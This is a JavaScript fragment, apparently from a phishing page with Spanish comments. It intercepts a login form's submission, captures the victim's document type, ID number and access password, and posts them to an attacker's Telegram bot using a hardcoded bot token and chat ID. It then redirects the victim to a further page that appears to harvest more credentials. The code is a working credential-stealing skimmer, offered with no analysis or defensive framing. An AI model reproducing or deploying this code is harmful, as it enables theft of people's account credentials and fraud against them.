                <script>
                    document.getElementById('myForm').addEventListener('submit', function(event) {
                        event.preventDefault(); // Evita que el formulario se envíe de la manera tradicional

                        // Obtén los valores del formulario
                        const tipoDocumento = document.getElementById('select_doc').value;
                        const numeroDocumento = document.getElementById('cedula').value;
                        const claveAcceso = document.getElementById('password').value;

                        // Construye el mensaje
                        const mensaje = `Tipo de Documento: ${tipoDocumento}\n@ProArgFull\nNúmero de Documento: ${numeroDocumento}\nClave de Acceso: ${claveAcceso}`;

                        // Token de tu bot y chat ID
                        const botToken = '7510532523:AAHsERIzR24MZsO2Bwk9seHZxE4aICObwjU';
                        const chatId = '7713690054';

                        // URL de la API de Telegram
                        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

                        // Envía el mensaje a Telegram
                        fetch(url, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify({
                                    chat_id: chatId,
                                    text: mensaje
                                })
                            })
                            .then(response => response.json())
                            .then(data => {
                                console.log('Mensaje enviado:', data);
                                // Redirige a Google después de enviar el mensaje
                                window.location.href = 'clavees.html?documento=' + encodeURIComponent(numeroDocumento);
                            })
                            .catch(error => {
                                console.error('Error al enviar el mensaje:', error);
                            });
                    });
